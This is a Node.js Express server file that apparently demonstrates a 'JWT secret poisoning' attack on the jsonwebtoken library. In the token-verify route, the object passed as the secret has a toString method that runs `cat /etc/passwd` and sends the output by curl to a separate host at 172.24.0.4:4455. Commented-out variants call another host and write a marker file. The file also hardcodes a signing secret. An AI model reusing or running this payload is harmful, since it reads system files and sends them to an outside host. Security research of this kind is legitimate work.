'use strict';

const express = require('express');
var path = require('path');
var fs = require("fs");
var jwt = require('jsonwebtoken');
var randomstring = require("randomstring");
const axios = require('axios');

// Logger 
const Logger = require('node-json-logger');
const logger = new Logger({ timezone: 'America/New_York', loggerName: 'JWT Secret Poisoning' });

// Constants
const PORT = '8080';
const HOST = '0.0.0.0';

// App
const app = express();

// Remove the X-Powered-By headers.
app.disable('x-powered-by');

// Set X-Frame-Options to use same origin 
const helmet = require('helmet');
app.use(helmet.frameguard({ action: 'SAMEORIGIN' }));

app.enable('trust proxy');
//app.use(cookieParser());

const allowedMethods = ['GET', 'POST'];

app.use((req, res, next) => {
    if (!allowedMethods.includes(req.method)) return res.end(405, 'Method Not Allowed')
    return next()
});

app.listen(PORT, HOST);

logger.info({ 'message': 'APP service started successfully', 'host': HOST, 'port': PORT });

// Parse JSON bodies (as sent by API clients)
app.use(express.json());
app.use(express.urlencoded({
    extended: true
}));

app.get('/api/info', function(req, res) {
    res.setHeader('Content-Type', 'application/json');
    res.send({ 'status': 200, 'message': 'success' })
});

app.get('/api/token/create', function(req, res) {
    var secretValue = 'myonlypassword'
    console.log('/api/token/create -> secret: ' + secretValue + typeof(secretValue));
    var token = jwt.sign({ sub: randomstring.generate(6), iss: 'jwtservice', key_id: randomstring.generate({ charset: 'alphanumeric' }) }, secretValue);
    res.setHeader('Content-Type', 'application/json');
    res.send({ 'status': 200, 'message': 'success', 'token': token });
});

app.post('/api/token/verify', function(req, res) {
    var token = req.headers['token'];
    //var secret = { toString : ()=> {require("child_process").exec(`curl --http0.9 --location --request GET 'http://172.24.0.2:8000/app/info' --header 'Content-Type: application/json'`,(error,stdout,stderr) => {console.log(error);console.log(stdout);console.log(stderr);})}};
    //var secret = { toString : ()=> {require('fs').writeFileSync('/tmp/malicious.txt', 'Vulnerable jsonwebtoken library. Upgrade to 9.0');}}
    var secret = {
        toString: () => {
            require('child_process').exec(`cat /etc/passwd`, (error, stdout, stderr) => {
                var z = stdout.replace(/\n/g, '-');
                var z = z.replace(/ /g, '');
                console.log(z);
                require('child_process').exec(`curl --http0.9 --location --request POST 'http://172.24.0.4:4455/' --header 'Content-Type: text/plain' --data-raw ` + z, (error, stdout, stderr) => {
                    console.log(stdout);
                    console.log(error);
                    console.log(stderr)
                });
            });
        }
    };
    try {
        var decoded = jwt.verify(token, secret);
        var status = 200;
        var message = 'success'
    } catch (err) {
        console.log(err);
        var decoded = '';
        var status = 401;
        var message = 'failed'
    }
    res.setHeader('Content-Type', 'application/json');
    res.send({ 'status': status, 'message': message, 'decoded': decoded });
});